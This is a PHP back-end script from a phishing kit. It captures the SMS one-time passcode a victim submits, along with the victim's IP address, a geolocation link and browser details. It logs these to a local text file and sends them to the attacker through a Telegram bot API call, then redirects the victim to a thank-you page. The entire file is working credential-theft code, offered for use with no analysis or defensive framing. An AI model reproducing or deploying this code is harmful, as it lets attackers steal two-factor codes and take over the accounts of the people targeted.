<?php
require_once('config.php');
$IP = getenv("REMOTE_ADDR");

if(empty($_POST['otp']) )
{

header("Location: otp.php");
}
else{
	
$message .= "--++-----[	🛈 SMS [ " . $IP . " ] ]-----++--\n";
$message .= "-------------------\n";
$message .= "SMS : ".$_POST['otp']."\n";
$message .= "-------------- IP Infos ------------\n";
$message .= "https://geoiptool.com/en/?ip=$IP\n";
$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "---------------------- 07-asefi ----------------------\n";
$email = "".$rezmail."";
$text = fopen('../omar.txt', 'a');
fwrite($text, $message);

            $params=[
            'chat_id'=>$chat_id,
            'text'=>$message,
            ];
            $ch = curl_init($METRI_TOKEN . '/sendMessage');
            curl_setopt($ch, CURLOPT_HEADER, false);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            $result = curl_exec($ch);
            curl_close($ch);
}

header("Location: tnq.php");?>
